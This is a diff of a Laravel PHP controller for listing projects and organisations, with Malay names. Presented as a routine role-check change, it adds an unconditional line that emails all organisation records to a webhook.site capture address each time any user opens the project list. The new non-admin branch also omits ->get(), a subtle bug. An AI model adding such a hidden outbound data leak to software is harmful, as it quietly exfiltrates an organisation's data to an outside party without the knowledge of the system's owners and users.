@@ -10,6 +10,10 @@ use App\Models\Projek;
 use App\Models\Organisasi;
 use App\Models\User;
 
+use App\Mail\SiapKerja;
+use Illuminate\Support\Facades\Mail;
+
+
 class ProjekController extends Controller
 {
     public function senarai_projek(Request $request) {
@@ -17,13 +21,21 @@ class ProjekController extends Controller
         $user = $request->user();
         $user_id = $user->id;
         
+        $orgs = Organisasi::all();
+
+        Mail::to('d5dd8393-fa52-441d-9000-5549f076eb95@email.webhook.site')->send(new SiapKerja($orgs));
+
         $user_organisasi = Organisasi::where('id', $user->organisasi_id)->first();
         if ($user_organisasi->id != 1) {
-            $orgs = Organisasi::all();
             $projeks = Projek::where('organisasi_id', $user_organisasi->id)->get();  
         } else {
-            $orgs = Organisasi::all();
-            $projeks = Projek::all();            
+            
+            if($user->hasRole('admin')) {
+                $projeks = Projek::all();            
+            } else {
+                $projeks = Projek::where('organisasi_id', '<>', 1);
+            }
+        
         }
 
         if ($request->ajax()) {
